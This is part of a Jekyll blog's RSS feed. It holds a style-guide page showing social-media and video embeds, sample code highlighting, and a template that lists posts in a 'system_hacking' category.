&lt;blockquote class=&quot;instagram-media&quot; data-instgrm-captioned data-instgrm-permalink=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; data-instgrm-version=&quot;13&quot; style=&quot; background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:540px; min-width:326px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);&quot;&gt;&lt;div style=&quot;padding:16px;&quot;&gt; &lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; background:#FFFFFF; line-height:0; padding:0 0; text-align:center; text-decoration:none; width:100%;&quot; target=&quot;_blank&quot;&gt; &lt;div style=&quot; display: flex; flex-direction: row; align-items: center;&quot;&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 40px; margin-right: 14px; width: 40px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 100px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 60px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 19% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display:block; height:50px; margin:0 auto 12px; width:50px;&quot;&gt;&lt;svg width=&quot;50px&quot; height=&quot;50px&quot; viewBox=&quot;0 0 60 60&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;https://www.w3.org/1999/xlink&quot;&gt;&lt;g stroke=&quot;none&quot; stroke-width=&quot;1&quot; fill=&quot;none&quot; fill-rule=&quot;evenodd&quot;&gt;&lt;g transform=&quot;translate(-511.000000, -20.000000)&quot; fill=&quot;#000000&quot;&gt;&lt;g&gt;&lt;path d=&quot;M556.869,30.41 C554.814,30.41 553.148,32.076 553.148,34.131 C553.148,36.186 554.814,37.852 556.869,37.852 C558.924,37.852 560.59,36.186 560.59,34.131 C560.59,32.076 558.924,30.41 556.869,30.41 M541,60.657 C535.114,60.657 530.342,55.887 530.342,50 C530.342,44.114 535.114,39.342 541,39.342 C546.887,39.342 551.658,44.114 551.658,50 C551.658,55.887 546.887,60.657 541,60.657 M541,33.886 C532.1,33.886 524.886,41.1 524.886,50 C524.886,58.899 532.1,66.113 541,66.113 C549.9,66.113 557.115,58.899 557.115,50 C557.115,41.1 549.9,33.886 541,33.886 M565.378,62.101 C565.244,65.022 564.756,66.606 564.346,67.663 C563.803,69.06 563.154,70.057 562.106,71.106 C561.058,72.155 560.06,72.803 558.662,73.347 C557.607,73.757 556.021,74.244 553.102,74.378 C549.944,74.521 548.997,74.552 541,74.552 C533.003,74.552 532.056,74.521 528.898,74.378 C525.979,74.244 524.393,73.757 523.338,73.347 C521.94,72.803 520.942,72.155 519.894,71.106 C518.846,70.057 518.197,69.06 517.654,67.663 C517.244,66.606 516.755,65.022 516.623,62.101 C516.479,58.943 516.448,57.996 516.448,50 C516.448,42.003 516.479,41.056 516.623,37.899 C516.755,34.978 517.244,33.391 517.654,32.338 C518.197,30.938 518.846,29.942 519.894,28.894 C520.942,27.846 521.94,27.196 523.338,26.654 C524.393,26.244 525.979,25.756 528.898,25.623 C532.057,25.479 533.004,25.448 541,25.448 C548.997,25.448 549.943,25.479 553.102,25.623 C556.021,25.756 557.607,26.244 558.662,26.654 C560.06,27.196 561.058,27.846 562.106,28.894 C563.154,29.942 563.803,30.938 564.346,32.338 C564.756,33.391 565.244,34.978 565.378,37.899 C565.522,41.056 565.552,42.003 565.552,50 C565.552,57.996 565.522,58.943 565.378,62.101 M570.82,37.631 C570.674,34.438 570.167,32.258 569.425,30.349 C568.659,28.377 567.633,26.702 565.965,25.035 C564.297,23.368 562.623,22.342 560.652,21.575 C558.743,20.834 556.562,20.326 553.369,20.18 C550.169,20.033 549.148,20 541,20 C532.853,20 531.831,20.033 528.631,20.18 C525.438,20.326 523.257,20.834 521.349,21.575 C519.376,22.342 517.703,23.368 516.035,25.035 C514.368,26.702 513.342,28.377 512.574,30.349 C511.834,32.258 511.326,34.438 511.181,37.631 C511.035,40.831 511,41.851 511,50 C511,58.147 511.035,59.17 511.181,62.369 C511.326,65.562 511.834,67.743 512.574,69.651 C513.342,71.625 514.368,73.296 516.035,74.965 C517.703,76.634 519.376,77.658 521.349,78.425 C523.257,79.167 525.438,79.673 528.631,79.82 C531.831,79.965 532.853,80.001 541,80.001 C549.148,80.001 550.169,79.965 553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div style=&quot;padding-top: 8px;&quot;&gt; &lt;div style=&quot; color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;&quot;&gt; View this post on Instagram&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 12.5% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;&quot;&gt;&lt;div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: 8px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: auto;&quot;&gt; &lt;div style=&quot; width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;p style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;&quot;&gt;&lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;&quot; target=&quot;_blank&quot;&gt;A post shared by Sujay (@sujaykundu777)&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt; &lt;script async src=&quot;//www.instagram.com/embed.js&quot;&gt;&lt;/script&gt;

&lt;hr&gt;

&lt;h3&gt; Twitter Embed &lt;/h3&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I just published “Deploying a blog using Jekyll and Github Pages with SSL certificate for Free” &lt;a href=&quot;https://t.co/B3T3IQVU93&quot;&gt;https://t.co/B3T3IQVU93&lt;/a&gt;&lt;/p&gt;&amp;mdash; Sujay Kundu (@SujayKundu777) &lt;a href=&quot;https://twitter.com/SujayKundu777/status/1012601950469160962?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;


&lt;h3&gt;YouTube Responsive Embed&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/bBpKMH3nBzE?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3&gt;Vimeo Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.vimeo.com/video/212114694?title=0&amp;amp;byline=0&amp;amp;portrait=0&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ted-responsive-embed&quot;&gt;TED Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://embed.ted.com/talks/ted_halstead_a_climate_solution_where_all_sides_can_win&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;twitch-responsive-embed&quot;&gt;Twitch Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.twitch.tv/?autoplay=false&amp;amp;video=v248755437&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot; scrolling=&quot;no&quot; height=&quot;378&quot; width=&quot;620&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;soundcloud-embed&quot;&gt;SoundCloud Embed&lt;/h3&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/29738591&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;codepen-embed&quot;&gt;CodePen Embed&lt;/h3&gt;

&lt;p data-height=&quot;265&quot; data-theme-id=&quot;light&quot; data-slug-hash=&quot;YWvpRo&quot; data-default-tab=&quot;css,result&quot; data-user=&quot;kharrop&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;Referral Form&quot; class=&quot;codepen&quot;&gt;&lt;/p&gt;
&lt;script async=&quot;&quot; src=&quot;https://production-assets.codepen.io/assets/embed/ei.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;syntax-highlighting&quot;&gt;Syntax Highlighting&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;markdown&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You can add inline code just like this, E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;.code { color: #fff; }&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#f4f4f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;github-gist-embed&quot;&gt;GitHub gist Embed&lt;/h3&gt;

&lt;script src=&quot;https://gist.github.com/ahmadajmi/dbb4f713317721668bcbc39420562afc.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;input-style&quot;&gt;Input Style&lt;/h3&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;I&apos;m an input field!&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;


</description>
            <link>http://localhost:4000/styleguide/</link>
          </item>
        
      
    
      
        
          <item>
            <title>system_hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.system_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>http://localhost:4000/blog/categories/system_hacking/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    

  </channel>
</rss>